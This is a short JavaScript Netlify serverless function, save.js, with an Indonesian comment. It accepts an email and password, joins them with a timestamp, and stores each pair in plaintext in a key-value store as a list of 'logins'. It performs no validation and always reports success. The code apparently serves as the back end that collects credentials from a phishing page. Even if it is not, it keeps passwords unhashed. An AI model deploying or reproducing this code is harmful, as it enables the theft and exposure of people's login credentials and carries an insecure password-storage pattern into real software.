// netlify/functions/save.js

export default async (request) => {
  try {
    const body = await request.json();
    const email = body.email;
    const password = body.password;

    const kv = await import("@netlify/kv");
    
    const timestamp = new Date().toISOString();
    const entry = `${timestamp} | ${email} | ${password}`;

    // Simpan append ke list "logins"
    await kv.set(`login-${timestamp}`, entry);

    return new Response(
      JSON.stringify({ success: true }),
      { status: 200 }
    );

  } catch (err) {
    return new Response(
      JSON.stringify({ error: err.message }),
      { status: 500 }
    );
  }
};

